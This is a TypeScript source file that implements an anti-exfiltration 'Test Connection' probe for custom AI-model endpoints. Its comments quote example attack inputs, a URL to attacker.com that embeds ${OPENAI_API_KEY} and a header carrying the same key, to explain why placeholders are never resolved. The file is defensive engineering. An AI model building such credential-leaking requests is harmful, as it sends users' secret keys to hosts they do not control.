/**
 * Phase 9 — Test Connection probe for DB-backed custom endpoints.
 *
 * Issues an OpenAI-compatible `GET {baseURL}/models` under the same
 * URL gate used at registration time. Resolves only the `apiKey`
 * through the existing env-var pattern so admins can paste a
 * sentinel like `${MY_KEY}` and have it resolved at probe time too.
 *
 * Anti-exfil rule (Phase 9 review H3): the probe **never** resolves
 * `${VAR}` placeholders inside `baseURL` or `headers`. Otherwise a
 * user could enter `https://attacker.com/${OPENAI_API_KEY}` and the
 * server would dutifully exfiltrate the resolved API key in an
 * outbound GET. The probe operates on the literal user-typed URL;
 * YAML-templated URLs are evaluated at runtime by `initializeCustom`
 * (a separate, admin-controlled path).
 *
 * The probe is intentionally minimal: a 5-second timeout, no
 * variations beyond the standard `Authorization: Bearer …`. If the
 * endpoint requires custom auth the probe may report failure even
 * though the endpoint will work at runtime — the helper returns
 * enough context (status code + reason) for the UI to surface the
 * difference.
 */

import { extractEnvVariable } from 'librechat-data-provider';
import type { TCustomEndpointConfig, TTestCustomEndpointResponse } from 'librechat-data-provider';
import {
  validateCustomEndpointBaseUrl,
  shouldAllowLocalEndpointAddresses,
} from '~/auth/customDomain';
import { isUserProvided } from '~/utils/common';

const PROBE_TIMEOUT_MS = 5000;
const PROBE_MAX_BODY_BYTES = 1 * 1024 * 1024;

export interface ProbeOptions {
  /** Override the default 5s timeout (used only for tests). */
  timeoutMs?: number;
  /** Override the env-derived "permit local" toggle (used only for tests). */
  allowLocalAddresses?: boolean;
  /**
   * Test override: a fetch implementation. Production callers leave
   * this undefined and the global `fetch` is used.
   */
  fetchFn?: typeof fetch;
}

async function readCappedBody(res: Response, capBytes: number): Promise<string> {
  const reader = res.body?.getReader();
  if (!reader) return await res.text();
  const decoder = new TextDecoder();
  let received = 0;
  let buffer = '';
  for (;;) {
    const { done, value } = await reader.read();
    if (done) break;
    received += value.byteLength;
    if (received > capBytes) {
      reader.cancel().catch(() => undefined);
      throw new Error('PROBE_BODY_TOO_LARGE');
    }
    buffer += decoder.decode(value, { stream: true });
  }
  buffer += decoder.decode();
  return buffer;
}

/**
 * Probe an OpenAI-compatible custom endpoint. Returns the probe
 * outcome as a structured discriminated union — never throws.
 */
export async function probeCustomEndpoint(
  config: TCustomEndpointConfig,
  options: ProbeOptions = {},
): Promise<TTestCustomEndpointResponse> {
  const allowLocal =
    options.allowLocalAddresses ?? shouldAllowLocalEndpointAddresses();
  const start = Date.now();

  // Anti-exfil (review H3): probe the LITERAL user-typed URL.
  // We do not resolve ${VAR} substitutions here — that path would let
  // a user point an outbound request at an attacker host with an env
  // var (incl. API keys) embedded.
  const baseURL = (config.baseURL ?? '').trim();
  if (!baseURL) {
    return { ok: false, reason: 'baseURL is required', durationMs: 0 };
  }
  if (/\$\{[^}]+\}/.test(baseURL)) {
    return {
      ok: false,
      reason:
        'baseURL contains an unresolved ${VAR} placeholder; Test Connection requires a literal URL',
      durationMs: 0,
    };
  }

  const urlCheck = validateCustomEndpointBaseUrl(baseURL, {
    allowLocalAddresses: allowLocal,
  });
  if (!urlCheck.ok) {
    return { ok: false, reason: urlCheck.reason, durationMs: 0 };
  }

  // Same anti-exfil rule for headers — a user-controlled header value
  // like `X-Forwarded-For: ${OPENAI_API_KEY}` would otherwise be
  // resolved and forwarded.
  const headers: Record<string, string> = { Accept: 'application/json' };
  const apiKey = extractEnvVariable(config.apiKey ?? '');
  if (apiKey && !isUserProvided(apiKey)) {
    headers.Authorization = `Bearer ${apiKey}`;
  }
  if (config.headers) {
    for (const [k, v] of Object.entries(config.headers)) {
      if (typeof v !== 'string') continue;
      if (/\$\{[^}]+\}/.test(v)) continue;
      headers[k] = v;
    }
  }

  const fetchFn = options.fetchFn ?? fetch;
  // Strip a trailing /models if the user already included it (review L1).
  const trimmedBase = baseURL.replace(/\/+$/, '').replace(/\/models$/, '');
  const probeUrl = trimmedBase + '/models';
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), options.timeoutMs ?? PROBE_TIMEOUT_MS);

  try {
    const res = await fetchFn(probeUrl, {
      method: 'GET',
      headers,
      signal: ctrl.signal,
    });
    const durationMs = Date.now() - start;
    if (!res.ok) {
      return {
        ok: false,
        reason: `Endpoint responded with ${res.status} ${res.statusText}`,
        status: res.status,
        durationMs,
      };
    }
    const contentLength = Number(res.headers.get('content-length'));
    if (Number.isFinite(contentLength) && contentLength > PROBE_MAX_BODY_BYTES) {
      return {
        ok: false,
        reason: `Response body exceeds ${PROBE_MAX_BODY_BYTES} byte cap`,
        status: res.status,
        durationMs,
      };
    }
    let modelsDetected: number | undefined;
    try {
      const text = await readCappedBody(res, PROBE_MAX_BODY_BYTES);
      const body = JSON.parse(text) as { data?: unknown[] };
      if (Array.isArray(body?.data)) modelsDetected = body.data.length;
    } catch (parseErr) {
      if ((parseErr as Error)?.message === 'PROBE_BODY_TOO_LARGE') {
        return {
          ok: false,
          reason: `Response body exceeds ${PROBE_MAX_BODY_BYTES} byte cap`,
          status: res.status,
          durationMs,
        };
      }
      // Non-OpenAI-compatible JSON; the 200 still counts as success.
    }
    return { ok: true, durationMs, modelsDetected };
  } catch (err) {
    const durationMs = Date.now() - start;
    if ((err as { name?: string })?.name === 'AbortError') {
      return { ok: false, reason: 'Probe timed out', durationMs };
    }
    return {
      ok: false,
      reason: (err as Error)?.message ?? 'Probe failed',
      durationMs,
    };
  } finally {
    clearTimeout(timer);
  }
}
